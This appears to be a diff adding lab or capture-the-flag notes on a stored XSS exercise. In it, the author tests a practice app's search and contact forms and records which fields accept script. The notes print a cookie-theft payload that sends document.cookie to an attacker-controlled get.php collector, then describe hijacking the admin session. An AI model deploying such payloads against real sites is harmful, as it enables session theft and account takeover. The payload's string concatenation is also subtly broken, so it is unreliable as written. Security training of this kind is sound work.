@@ -1,0 +1,46 @@
+Description
+
+	- attack address: 192.168.99.10
+	- app allows registered users to add comments
+		u: attacker
+		p: attacker 
+
+	- Receive stolen cookies on: http://192.168.99.11/get.php
+		- takes all parameters passed via: 
+			- GET 
+		- stores them in 
+			- jar.txt 
+
+Goal 
+
+	- admin visits page every couple of minutes 
+	- steal the administrators cookies via XSS 
+	- once you have the cookies you should be able to access: 
+		- admin.php 
+
+Findings 
+
+	- search bar in .../search.php is vulnerable to XSS (SEARCH BAR IS VOLATILE)
+		- <script>alert('XSS');</script> // passed 
+		- <script>alert(document.cookie);</script> // passed 
+
+	- Feebackpage (contact.php)
+		- name field: // negative 
+		- email field: // negative 
+		- subject: <h1> //  positive 
+			- cookie script // positive
+
+	- the logic choice was the contact page as this would need to be refreshed. 
+	- there was no need to upload the .php get code as it was already there. 
+
+	
+	- what was required was the cookie_theft_script 
+		<script> 
+		var i = new Image(); 
+		i.src="http://attacker website.com/get.php?cookie=".document.cookie;
+		</script> 
+
+	- rechecked the 192.168.99.11/jar.txt 
+	and the new session appeared
+
+	- replaced my current cookie session and got admin privileges 
